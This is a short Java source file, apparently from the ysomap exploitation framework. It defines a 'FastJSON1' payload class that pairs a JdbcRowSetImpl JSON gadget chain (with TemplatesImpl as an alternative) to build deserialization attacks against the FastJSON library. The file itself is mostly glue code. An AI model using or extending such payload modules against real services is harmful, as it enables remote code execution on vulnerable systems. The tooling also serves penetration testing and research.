package ysomap.core.gadget.payload.json;

import ysomap.annotation.Authors;
import ysomap.annotation.Payloads;
import ysomap.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.gadget.bullet.json.JdbcRowSetImplJsonBullet;

/**
 * @author wh1t3P1g
 * @since 2020/3/18
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Authors({ Authors.WH1T3P1G })
@Require(bullets = {"JdbcRowSetImplJsonBullet","TemplatesImplJsonBullet"})
public class FastJSON1 extends AbstractJson {

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new JdbcRowSetImplJsonBullet();
    }

    @Override
    public Object pack(Object obj) throws Exception {
        return obj;
    }
}
